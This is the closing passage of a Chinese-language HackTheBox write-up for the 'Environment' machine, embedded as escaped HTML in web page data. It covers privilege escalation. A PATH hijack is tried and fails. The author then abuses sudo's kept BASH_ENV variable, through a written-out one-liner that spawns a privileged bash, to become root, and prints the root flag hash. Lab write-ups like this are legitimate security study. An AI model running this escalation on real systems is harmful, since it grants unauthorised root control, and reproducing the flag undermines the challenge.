###\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e -h\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后尝试了一下简单的路径劫持\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehish@environment:~$ \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e PATH=/home/hish:\u003cspan class=\"hljs-variable\"\u003e$PATH\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现不能成功，因为名字相同的 \u003ccode\u003eshell‑builtin\u003c/code\u003e 总是先被调用\u003c/p\u003e\n\u003cp\u003e但是可以注意到\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esudo\u003c/code\u003e 默认会清掉大部分环境变量，只有在这里明确 \u003ccode\u003eenv_keep\u003c/code\u003e 才会保留；\u003c/p\u003e\n\u003cp\u003e然后 \u003ccode\u003eENV BASH_ENV\u003c/code\u003e 是变量，我们可以控制，\u003ccode\u003ePayload\u003c/code\u003e是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'/bin/bash -p'\u003c/span\u003e \u003e /tmp/root.sh ; \u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e +x /tmp/root.sh ; \u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e -i BASH_ENV=/tmp/root.sh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/systeminfo\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里做了什么？\u003c/p\u003e\n\u003cp\u003e首先创建 \u003ccode\u003eroot.sh\u003c/code\u003e 执行后会创建一个新的 \u003ccode\u003eshell\u003c/code\u003e 。\u003ccode\u003eenv -i\u003c/code\u003e从一个\u003cstrong\u003e空环境\u003c/strong\u003e开始（清除掉所有原有环境变量），保证后面只存在我们显式指定的变量。\u003ccode\u003eBASH_ENV=/tmp/root.sh\u003c/code\u003e 这是非交互式 Bash 启动时会自动读取并执行的环境变量。我们把它指向刚刚写好的 \u003ccode\u003e/tmp/root.sh\u003c/code\u003e 。\u003ccode\u003ePATH=…\u003c/code\u003e\n设置一个最小可用的 PATH，保证后续 \u003ccode\u003esudo\u003c/code\u003e、\u003ccode\u003ebash\u003c/code\u003e、\u003ccode\u003eecho\u003c/code\u003e 等都能找到。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esudo /usr/bin/systeminfo\u003c/code\u003e 以 root 身份执行 \u003ccode\u003esysteminfo\u003c/code\u003e 脚本。因为 \u003ccode\u003esysteminfo\u003c/code\u003e 文件头是 \u003ccode\u003e#!/bin/bash\u003c/code\u003e，所以它会被非交互式的 Bash 解释执行。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@environment:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \n74c70b0fe4bcb9d5a6aff48c71046584\n\u003c/code\u003e\u003c/pre\u003e","title":"HackTheBox - Machine - Environment","date":"2025-05-06","updated":"2025-05-06","comments":true,"tags":["Linux靶机","HackTheBox","ENV","Laravel","路径劫持","encrypt"],"categories":"靶机","description":"Machine Environment https://app.hackthebox.com/machines/Environment | Linux | Medium 前期踩点 Web 渗透 信息收集 访问 HTTP 服务 可能是开发环境？ 扫描一下目录 /upload ，直接访问能得到 PHP...","isEncrypted":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxMachine - Environment"},"buildId":"yBQJLYy5vKYVdUmksNnT4","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>